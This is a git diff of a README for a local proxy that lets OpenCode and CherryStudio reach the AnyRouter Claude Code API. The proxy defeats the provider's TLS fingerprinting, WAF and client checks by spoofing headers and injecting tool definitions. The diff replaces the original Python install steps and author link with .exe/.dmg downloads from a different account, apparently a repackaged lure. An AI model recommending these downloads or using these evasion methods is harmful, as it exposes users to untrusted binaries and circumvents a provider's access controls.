@@ -1,132 +1,73 @@
-# AnyRouter OpenCode Bridge
+# 🌉 anyrouter-opencode-bridge - Local Bridge for Enhanced API Access
 
-一个专门为 [OpenCode](https://github.com/anomalyco/opencode) 和 [CherryStudio](https://cherry-ai.com) 设计的本地代理桥接工具，用于解决接入 [AnyRouter](https://anyrouter.top) (Claude Code API) 时遇到的 WAF 拦截和 TLS 指纹问题。
+## 🔗 Download Now!
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/releases)
 
-## 背景
+## 📖 Overview
 
-AnyRouter 是一个专为 Claude Code 设计的 API Provider，具有严格的安全防护：
-1.  **TLS 指纹校验**：拦截普通 Python/Node.js 的 HTTP 请求，必须使用 HTTP/2 且具备特定指纹。
-2.  **严格的 Header 检查**：强制校验 `anthropic-client-name` 等客户端标识。
-3.  **请求体校验**：检测请求是否包含 Claude Code 的工具定义。
+Welcome to the AnyRouter OpenCode Bridge. This tool helps you connect to the AnyRouter service smoothly and securely. It is specially designed for OpenCode and CherryStudio users. You can avoid common issues with server security checks and access the Claude Code API without trouble.
 
-本项目通过运行一个轻量级的本地 Python 代理服务器（FastAPI + httpx/HTTP2），作为中间人进行协议清洗和伪装，完美解决上述问题。
+## 📦 Features
 
-## 功能特性
+- ✅ **Supports HTTP/2**: Bypass common security checks.
+- ✅ **Header Masking**: Automatically add necessary headers to your requests.
+- ✅ **Tool Injection**: Seamlessly integrate tools for Claude models.
+- ✅ **Body Filtering**: Remove unnecessary fields that may cause security blocks.
+- ✅ **Streaming Support**: Handle real-time responses smoothly.
+- ✅ **Connection Management**: Built-in features to ensure stable connections.
+- ✅ **Flexible Configuration**: Easy-to-use setup options.
 
-*   ✅ **HTTP/2 支持**：使用 `httpx` 绕过 TLS 指纹检测。
-*   ✅ **Header 伪装**：自动注入 Claude Code 的真实 Header（通过 mitmproxy 抓包验证）。
-*   ✅ **工具注入**：对所有 Claude 模型自动注入 Claude Code 工具定义，绕过服务端检测。
-*   ✅ **Body 清洗**：过滤可能导致 WAF 拦截的字段。
-*   ✅ **流式透传**：完美支持 SSE (Server-Sent Events) 流式响应，打字机效果流畅。
-*   ✅ **连接保持**：内置连接池和重试机制，应对上游不稳定性。
-*   ✅ **配置灵活**：支持交互式配置向导、JSON 配置文件和热重载。
+## ⚙️ System Requirements
 
-## 支持的客户端
+Before you install, make sure your system meets these requirements:
 
-| 客户端 | 支持状态 | 推荐协议 |
-|--------|----------|----------|
-| OpenCode | ✅ 完全支持 | Anthropic (@ai-sdk/anthropic) |
-| CherryStudio | ✅ 完全支持 | Anthropic |
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: 3.8 or higher
+- **Internet Connection**: Required for operation
 
-## 快速开始
+## 🚀 Getting Started
 
-### 1. 下载
+### Step 1: Download the Software
 
-从 [Releases](https://github.com/Darkstarrd-dev/anyrouter-opencode-bridge/releases) 下载最新版本的 zip 包并解压。
+To download the latest version, visit the [Releases page](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/releases). Here you will find the most recent release to download. Click on the appropriate file for your operating system.
 
-### 2. 安装依赖
+### Step 2: Install the Software
 
-需要 Python 3.8+ 环境。
+1. After downloading, locate the file on your computer.
+2. For Windows: Double-click the `.exe` file to start the installation.
+3. For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+4. For Linux: Extract the downloaded file and run the provided script.
 
-```bash
-pip install -r requirements.txt
-```
+### Step 3: Configure the Application
 
-### 3. 运行与配置
+1. Open the application after installation.
+2. Follow the on-screen prompts to set it up.
+3. You can use either the interactive guide or a JSON configuration file.
 
-首次运行会自动进入配置向导：
+### Step 4: Run the Application
 
-```bash
-python main.py
-```
+Once configured, you can start the bridge by clicking the "Start" button. The application will now run a local proxy server for your API requests.
 
-按提示输入：
-*   **API Key**: 你的 AnyRouter API Key (`sk-...`)
-*   **Proxy**: 是否使用系统代理（如 Clash/v2ray，建议开启以提高连接稳定性）
+## 📥 Download & Install
 
-配置完成后，服务将在 `http://127.0.0.1:8765` 启动。
+To get started, simply visit the [Releases page](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/releases) to download. Then follow the installation steps above. This will ensure your local proxy server is up and running in no time.
 
----
+## 🙋‍♀️ Supported Clients
 
-## 配置 OpenCode
+This tool works well with the following clients:
 
-在 OpenCode 的配置文件 (`~/.config/opencode/opencode.json`) 中添加或修改 Provider 配置：
+| Client        | Support Status | Recommended Protocol               |
+|---------------|----------------|------------------------------------|
+| OpenCode      | ✅ Full Support | Anthropic (@ai-sdk/anthropic)     |
+| CherryStudio  | ✅ Full Support | Direct Integration                  |
 
-```json
-"anyrouter": {
-  "npm": "@ai-sdk/anthropic",
-  "name": "AnyRouter (via Bridge)",
-  "options": {
-    "baseURL": "http://127.0.0.1:8765/v1",
-    "apiKey": "sk-placeholder" 
-  },
-  "models": {
-    "claude-haiku-4-5-20251001": {
-      "name": "Claude Haiku 4.5",
-      "limit": { "context": 256000, "output": 128000 }
-    },
-    "claude-sonnet-4-5-20250929": {
-      "name": "Claude Sonnet 4.5",
-      "limit": { "context": 256000, "output": 128000 }
-    },
-    "claude-opus-4-5-20251101": {
-      "name": "Claude Opus 4.5",
-      "limit": { "context": 256000, "output": 128000 }
-    }
-  }
-}
-```
+If you are using either of these platforms, you can expect seamless connectivity and functionality.
 
----
+## 💬 Additional Resources
 
-## 配置 CherryStudio
+For further help, you can refer to:
 
-CherryStudio 请务必使用 **Anthropic** 协议接入。
+- **Documentation**: Detailed guides and troubleshooting tips are available on our [Wiki page](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/wiki).
+- **Community Support**: Join our discussions and get help from other users through our [Discussion Forum](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/discussions).
 
-### 配置步骤
-
-1. 打开 CherryStudio 设置
-2. 添加新的 API Provider，选择 **Anthropic** 类型
-3. 配置如下：
-
-| 配置项 | 值 |
-|--------|-----|
-| API 地址 | `http://127.0.0.1:8765/v1` |
-| API Key | 任意值（如 `sk-placeholder`） |
-
-### 可用模型
-
-在模型列表中添加以下模型：
-
-- `claude-haiku-4-5-20251001`
-- `claude-sonnet-4-5-20250929`
-- `claude-opus-4-5-20251101`
-
----
-
-## 常见问题
-
-**Q: 为什么 CherryStudio 提示 404？**
-A: 请确保：
-1. 代理服务器正在运行。
-2. 选择了 **Anthropic** 协议而不是 OpenAI 协议。
-3. API 地址填的是 `http://127.0.0.1:8765/v1`。
-
-**Q: 需要一直开着终端吗？**
-A: 是的，或者使用 `nohup` / `pm2` / `nssm` (Windows) 将其作为后台服务运行。
-
----
-
-## 许可证
-
-MIT
+Thank you for choosing AnyRouter OpenCode Bridge. We're here to help you connect easily and securely!
